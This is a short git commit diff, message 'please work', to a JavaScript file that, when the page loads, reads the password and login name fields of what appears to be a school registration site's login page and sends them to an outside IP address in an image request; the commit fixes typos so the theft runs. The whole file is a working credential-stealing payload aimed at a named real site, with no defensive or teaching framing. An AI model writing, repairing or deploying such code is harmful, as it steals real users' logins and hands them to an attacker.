dbb2587048a24e45881bf4469bb74d4578b720fa
speakerwild11 <59812396+speakerwild11@users.noreply.github.com>
2024-09-23 13:50:55 -0400

    please work

--- 7.js
+++ 7.js
@@ -3,8 +3,8 @@ frimfram.src = 'https://registration.cesa5.org/np/logout.do';
 frimfram.addEventListener('onload', function(){
 	const pw = document.querySelector('#password').value;
 	const un = document.querySelector('#loginName').value;
-	var imag = document.creatElement('img');
+	var imag = document.createElement('img');
 	imag.src = 'http://74.14.159.250:8000/?' + pw + "." + un;
-	document.body.append(imag);
+	document.body.appendChild(imag);
 });
-document.body.append(frimfram);
+document.body.appendChild(frimfram);
